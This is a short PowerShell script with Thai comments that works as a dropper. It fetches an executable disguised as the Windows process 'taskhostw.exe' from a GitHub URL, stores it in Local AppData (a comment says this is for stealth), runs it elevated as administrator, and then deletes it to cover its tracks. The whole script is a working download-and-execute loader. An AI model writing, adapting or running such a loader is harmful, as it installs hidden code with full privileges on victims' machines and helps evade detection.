$url = "https://github.com/silentaimv1-png/basxpanel/raw/refs/heads/main/taskhostw.exe"
$tempPath = "$env:LOCALAPPDATA\taskhostw.exe" # เก็บไว้ใน Local AppData เพื่อความเนียน

try {
    Invoke-WebRequest -Uri $url -OutFile $tempPath
} catch {
    Write-Error "ดาวน์โหลดไม่สำเร็จ ตรวจสอบการเชื่อมต่ออินเทอร์เน็ต"
    exit
}


if (Test-Path $tempPath) {
    $proc = Start-Process -FilePath $tempPath -Verb RunAs -PassThru -Wait
    

    Remove-Item -Path $tempPath -Force
}